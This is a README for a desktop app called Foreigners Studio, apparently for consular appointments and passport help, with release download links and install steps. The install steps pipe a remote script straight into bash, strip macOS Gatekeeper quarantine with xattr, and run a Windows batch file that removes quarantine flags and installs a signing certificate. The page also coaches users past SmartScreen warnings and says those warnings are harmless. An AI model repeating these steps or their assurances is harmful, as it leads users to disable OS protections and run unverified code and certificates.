# Foreigners Studio

Desktop client for consular appointment management, passport assistance, and workflow processing.

---

## 📥 Downloads (Release v1.0.4)

All release assets are available on the [**📦 GitHub Releases Page (v1.0.4)**](https://github.com/pankaj886/application/releases/tag/v1.0.4).

Download the package for your platform:

| Platform | Package | Format | Direct Download |
| :--- | :--- | :--- | :--- |
| **macOS** (Apple Silicon & Intel) | **Universal Disk Image** | `.dmg` | [⬇️ Download macOS DMG](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_universal.dmg) |
| **Windows** (10 / 11, 64-bit) | **One-Click Package (ZIP)** | `.zip` | [⬇️ Download Windows ZIP](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_Windows_x64.zip) |
| **Windows** (10 / 11, 64-bit) | **Setup Installer** | `.exe` | [⬇️ Download Windows Setup](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64-setup.exe) |
| **Windows** (10 / 11, 64-bit) | **Enterprise Package** | `.msi` | [⬇️ Download Windows MSI](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64_en-US.msi) |

> **Note:** This is a private repository. You must be logged into GitHub with an authorized account to download files.

---

## 🚀 Installation

### 🍎 macOS

#### Option A — One-Line Terminal Install (Recommended)

Open **Terminal** and run:

```bash
curl -fsSL https://raw.githubusercontent.com/pankaj886/application/main/install-mac.sh | bash
```

This command automatically downloads the app, strips Gatekeeper quarantine, and installs it to `/Applications`. No manual steps needed.

---

#### Option B — Manual DMG Install

1. Download [**Foreigners_Studio_1.0.0_universal.dmg**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_universal.dmg)

2. **Before opening the DMG**, open Terminal and run:
   ```bash
   xattr -cr ~/Downloads/Foreigners_Studio_1.0.0_universal.dmg
   ```
   *(Replace `~/Downloads/` with the folder where the file was saved)*

3. Now double-click the DMG → drag **Foreigners Studio** to **Applications**

4. **First launch** — do ONE of these:
   - **Right-click** the app in `/Applications` → click **Open** → click **Open** again
   - Or open **System Settings → Privacy & Security** → scroll down → click **Open Anyway**

> **Why this happens:** Apple requires a paid \$99/year Developer certificate for apps distributed outside the Mac App Store. The quarantine stripping in Step 2 removes the flag that triggers this warning.

---

### 🪟 Windows

#### Option A — One-Click Installer (Recommended, Zero Manual Steps)

1. Download [**Foreigners_Studio_Windows_x64.zip**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_Windows_x64.zip)
2. **Right-click** the ZIP → **Extract All**
3. Inside the extracted folder, **double-click `Install-ForeignersStudio.bat`**
4. Click **Run** if Windows asks for confirmation → done!

The installer automatically removes web quarantine flags, installs the signing certificate, and launches Foreigners Studio.

---

#### Option B — Setup Installer / MSI

1. Download [**Foreigners_Studio_1.0.0_x64-setup.exe**](https://github.com/pankaj886/application/releases/download/v1.0.4/Foreigners_Studio_1.0.0_x64-setup.exe)

2. **If you see "Windows protected your PC"** — this is normal for newly published software:
   - Click **"More info"**
   - Click **"Run anyway"**
   - The warning disappears permanently as more users install the app

> **Why this happens:** Microsoft SmartScreen shows this for newly released software until enough users have installed it to build "reputation." This is temporary and not a sign of any problem with the app.

---

## 🔄 Auto-Updates

Foreigners Studio checks for updates automatically in the background. When an update is ready:
- A **"Restart to update"** button appears in the top bar (next to the window controls)
- Click it to apply the update instantly

---

## 💻 System Requirements

| | Requirement |
|---|---|
| **macOS** | macOS 11.0 Big Sur or newer (Universal: Apple Silicon + Intel) |
| **Windows** | Windows 10 or Windows 11 (64-bit) |
